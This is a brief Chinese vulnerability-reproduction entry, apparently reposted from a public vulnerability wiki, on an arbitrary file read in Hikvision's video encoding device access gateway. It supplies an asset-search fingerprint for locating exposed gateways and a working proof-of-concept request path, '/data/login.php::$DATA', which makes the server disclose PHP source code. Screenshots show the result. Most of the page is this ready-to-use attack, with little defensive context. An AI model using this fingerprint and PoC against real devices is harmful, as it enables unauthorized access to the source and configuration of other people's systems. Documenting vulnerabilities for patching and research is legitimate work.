---
title: "Hikvision 视频编码设备接入网关 $DATA 任意文件读取"
date: 2026-10-18 09:14:46
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "HIKVISION"
tags:
  - "HIKVISION"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

Hikvision 视频编码设备接入网关存在配置错误特性，特殊后缀请求php文件可读取源码

## 漏洞影响

```
Hikvision 视频编码设备接入网关
```

## 网络测绘

```
title="视频编码设备接入网关"
```

## 漏洞复现

登陆页面

![image-20220519174129368](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191741462.png)

POC

```
/data/login.php::$DATA
```

![image-20220519174235421](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202205191742487.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/HIKVISION-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%24DATA-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md)
